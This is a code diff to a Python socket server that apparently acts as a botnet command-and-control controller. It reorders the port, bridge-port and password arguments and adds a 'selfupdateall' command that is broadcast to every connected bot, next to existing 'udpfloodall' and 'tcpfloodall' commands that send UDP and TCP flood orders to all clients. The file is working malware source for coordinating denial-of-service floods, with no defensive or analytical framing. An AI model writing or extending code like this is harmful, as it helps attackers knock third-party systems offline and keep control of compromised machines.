@@ -5,10 +5,10 @@ from socket import *
 
 if (len(sys.argv) == 4):
 	port = int(sys.argv[1])
-	password = sys.argv[2]
-	bridgeport = int(sys.argv[3])
+	bridgeport = int(sys.argv[2])
+	password = sys.argv[3]
 else:
-	sys.exit("Usage: server.py <port> <password> <bridge port>")
+	sys.exit("Usage: server.py <port> <bridge port> <password>")
 
 intro = """
  ____ ____ ____ ____ ____ ____ 
@@ -149,6 +149,12 @@ def main():
 					if (sendController("[SERVER - ERROR] Client doesn't exist\n", q) == 0): break
 
 			elif ("udpfloodall " in command or "tcpfloodall " in command):
+				for item in allConnections:
+					try:
+						item.send(command)
+					except:
+						pass
+			elif (command == "selfupdateall"):
 				for item in allConnections:
 					try:
 						item.send(command)
